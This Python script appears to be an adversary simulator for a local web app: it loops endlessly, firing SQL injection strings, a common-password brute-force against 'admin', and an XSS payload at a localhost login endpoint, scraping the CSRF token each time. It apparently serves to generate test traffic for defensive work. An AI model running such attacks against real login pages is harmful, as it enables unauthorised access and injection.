import requests
import random
import time
import re

BASE_URL = "http://localhost:5000"

def get_csrf_token(session, url):
    try:
        response = session.get(url)
        match = re.search(r'name="csrf_token" value="([^"]+)"', response.text)
        if match:
            return match.group(1)
    except:
        pass
    return None

def sql_injection_attack():
    session = requests.Session()
    url = f"{BASE_URL}/auth/login"
    token = get_csrf_token(session, url)
    if not token: return

    payloads = ["' OR '1'='1", "admin' --", "UNION SELECT 1,2,3--"]
    for p in payloads:
        try:
            r = session.post(url, data={
                'username': p,
                'password': 'password',
                'csrf_token': token
            })
            print(f"SQLi Attack ({p}): {r.status_code}")
        except: pass
        time.sleep(0.5)

def brute_force_attack():
    session = requests.Session()
    url = f"{BASE_URL}/auth/login"
    target = "admin"
    passwords = ["123456", "password", "admin123", "root", "qwerty", "master"]

    for p in passwords:
        token = get_csrf_token(session, url)
        if not token: continue
        try:
            r = session.post(url, data={
                'username': target,
                'password': p,
                'csrf_token': token
            })
            print(f"Brute Force ({p}): {r.status_code}")
        except: pass
        time.sleep(0.2)

def xss_attack():
    session = requests.Session()
    url = f"{BASE_URL}/auth/login"
    token = get_csrf_token(session, url)
    if not token: return

    payload = "<script>alert(1)</script>"
    try:
        r = session.post(url, data={
            'username': payload,
            'password': 'password',
            'csrf_token': token
        })
        print(f"XSS Attack: {r.status_code}")
    except: pass

def run_adversary():
    print("Starting Adversary Simulation...")
    attacks = [sql_injection_attack, brute_force_attack, xss_attack]
    while True:
        attack = random.choice(attacks)
        attack()
        time.sleep(random.uniform(2, 5))

if __name__ == "__main__":
    run_adversary()
